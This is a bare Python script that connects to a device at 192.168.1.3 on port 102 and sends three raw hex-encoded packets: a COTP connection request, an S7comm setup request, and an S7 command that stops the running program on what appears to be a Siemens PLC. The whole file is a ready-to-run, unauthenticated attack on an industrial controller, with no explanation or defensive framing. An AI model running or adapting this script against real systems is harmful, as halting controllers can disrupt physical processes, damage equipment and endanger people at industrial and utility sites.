import binascii
import socket
import time

client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
aimAddress = ('192.168.1.3',102)
client_socket.connect(aimAddress)

client_socket.settimeout(1)
a='0300001611e00000000300c1020101c2020101c0010a'
setup='0300001902f08032010000ccc100080000f0000001000103c0'
stop='0300002102f0803201000000050010000029000000000009505f50524f4752414d'


client_socket.send(binascii.unhexlify(a))
time.sleep(1)

client_socket.send(binascii.unhexlify(setup))
time.sleep(1)

client_socket.send(binascii.unhexlify(stop))
time.sleep(1)

client_socket.close()

